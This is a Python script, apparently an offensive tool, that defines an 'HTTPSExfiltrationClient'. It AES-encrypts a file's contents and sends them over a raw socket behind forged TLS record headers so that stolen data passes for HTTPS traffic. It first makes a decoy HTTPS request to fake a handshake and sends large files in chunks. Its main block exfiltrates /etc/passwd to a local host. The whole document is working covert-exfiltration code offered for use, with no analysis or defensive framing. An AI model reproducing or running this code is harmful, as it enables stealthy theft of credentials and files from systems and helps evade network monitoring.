#!/usr/bin/env python3

import ssl
import sys
import time
import socket
import hashlib
import urllib.request
import urllib.error

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

timeout = 2
socket.setdefaulttimeout(timeout)


def chunkstring(s, n):
    return [s[i:i + n] for i in range(0, len(s), n)]


class AESCipher:

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        if isinstance(raw, str):
            raw = raw.encode('utf-8')
        raw = self._pad(raw)
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        pad_len = self.bs - len(s) % self.bs
        return s + bytes([pad_len] * pad_len)

    @staticmethod
    def _unpad(s):
        return s[:-s[-1]]


class HTTPSExfiltrationClient:

    def __init__(self, host, key, port=443, max_size=8192):
        self.host = host
        self.port = port
        self.max_size = max_size
        self.aes = AESCipher(key=key)
        self.sock = None

        if self._pretend_ssl() != 0:
            sys.exit(1)
        if self._create_socket() != 0:
            sys.exit(1)

    def _pretend_ssl(self):
        try:
            urllib.request.urlopen('https://%s:%s/' % (self.host, self.port))
        except urllib.error.URLError:
            return 0
        except socket.error:
            sys.stderr.write("[!]\tCould not reach server to fake SSL handshake!\n")
            return 1
        except ssl.CertificateError:
            return 0
        return 0

    def _create_socket(self):
        try:
            sock = socket.socket()
            sock.connect((self.host, self.port))
            self.sock = sock
            return 0
        except socket.error as e:
            sys.stderr.write("[!]\tCould not connect to %s: %s\n" % (self.host, e))
            return 1

    def _round_it_up(self, my_int):
        if my_int == 0:
            return b"\x00\x00"
        b = my_int.to_bytes((my_int.bit_length() + 7) // 8, 'big')
        if len(b) == 1:
            return b"\x00" + b
        if len(b) == 2:
            return b
        return None

    def send_data(self, data):
        time.sleep(0.2)
        if self._create_socket() != 0:
            return 1
        if isinstance(data, str):
            data = data.encode('utf-8')
        enc = self.aes.encrypt(data)
        enc_len = len(enc)
        if enc_len > 0xFFFF:
            sys.stderr.write("[-]\tData is too long to send.\n")
            return 1
        length_bytes = enc_len.to_bytes(2, 'big')
        packet = b"\x17\x03\x03" + length_bytes + enc
        self.sock.send(packet)
        self.sock.close()
        sys.stdout.write("[.]\tSent '%s/%s'.\n" % (len(enc), len(packet)))
        return 0

    def send_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            sys.stdout.write("[+]\tFile '%s' loaded for exfiltration.\n" % file_path)
        except IOError as e:
            sys.stderr.write("[-]\tUnable to read file '%s': %s\n" % (file_path, e))
            return 1

        if len(data) < self.max_size - 9:
            enc = self.aes.encrypt(data)
            self.sock.send(b"\x17\x03\x03\x00\x00\x00\x01\x00\x01" + enc)
            sys.stdout.write("[+]\tSent file in one chunk.\n")
            return 0

        chunks = chunkstring(data, self.max_size - 9)
        blocks_count = self._round_it_up(len(chunks))

        for i, chunk in enumerate(chunks, start=1):
            enc = self.aes.encrypt(chunk)
            chunk_len = self._round_it_up(len(enc))
            if chunk_len is None:
                continue
            pkt_num = self._round_it_up(i)
            packet = b"\x17\x03\x03" + chunk_len + pkt_num + blocks_count + enc
            try:
                self.sock.send(packet)
            except socket.error:
                self._create_socket()
                self.sock.send(packet)
            sys.stdout.write("[.]\tSending block %s/%s - len(%s).\n" % (i, len(chunks), len(enc)))
            time.sleep(0.2)
        return 0

    def close(self):
        self._create_socket()
        time.sleep(0.1)
        self.sock.send(b"\x17\x03\x03\x16\x05\x16")
        self.sock.close()
        return 0


if __name__ == "__main__":
    client = HTTPSExfiltrationClient(host='127.0.0.1', key="123")
    client.send_file("/etc/passwd")
    client.close()
